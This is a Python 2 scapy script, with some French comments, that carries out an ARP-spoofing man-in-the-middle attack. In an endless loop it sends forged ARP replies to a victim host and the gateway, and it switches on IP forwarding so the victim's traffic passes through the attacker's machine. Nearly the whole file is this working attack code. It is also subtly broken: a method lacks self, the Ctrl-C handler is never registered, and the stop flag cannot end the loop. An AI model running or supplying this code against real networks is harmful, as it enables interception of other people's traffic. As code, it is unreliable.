#!/usr/bin/python
from scapy.all import *
import argparse
import signal
import sys
import logging
import time
import threading
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class sniffer(threading.Thread):
	def __init__(self, IpVictim, MacVictim, IpGw, MacGw): 
		threading.Thread.__init__(self)
		self.Terminated = False 
		self.IpVictim = IpVictim
		self.MacVictim = MacVictim
		self.IpGw = IpGw
		self.MacGw = MacGw

	def originalMAC(ip):
	    ans,unans = srp(ARP(pdst=ip), timeout=5, retry=3)
	    for s,r in ans:
		return r[Ether].src

	

	def run(self):
		print "IPVictim : "+self.IpVictim
		print "MacVictim : "+self.MacVictim
		print "IPGw : "+self.IpGw
		print "MacGw : "+self.MacGw
		def poison(routerIP, victimIP, routerMAC, victimMAC):
		    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
		    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
		def restore(routerIP, victimIP, routerMAC, victimMAC):
		    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
		    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
		    sys.exit("losing...")
		while not self.Terminated: 
			if os.geteuid() != 0:
				sys.exit("[!] Please run as root")
			if self.MacGw == None:
				sys.exit("Could not find router MAC address. Closing....")
			if self.MacVictim == None:
				sys.exit("Could not find victim MAC address. Closing....")
			with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
				ipf.write('1\n')
			def signal_handler(signal, frame):
				with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
					ipf.write('0\n')
				restore(self.IpGw, self.IpVictim, self.MacGw, self.MacVictim)
				signal.signal(signal.SIGINT, signal_handler)
			while 1:
				poison(self.IpGw, self.IpVictim, self.MacGw, self.MacVictim)
				time.sleep(1.5)
		print "Le thread sniff s'est bien termine"
    	#fonction permettant d'arreter la boucle du thread
	def stop(self): 
		self.Terminated = True







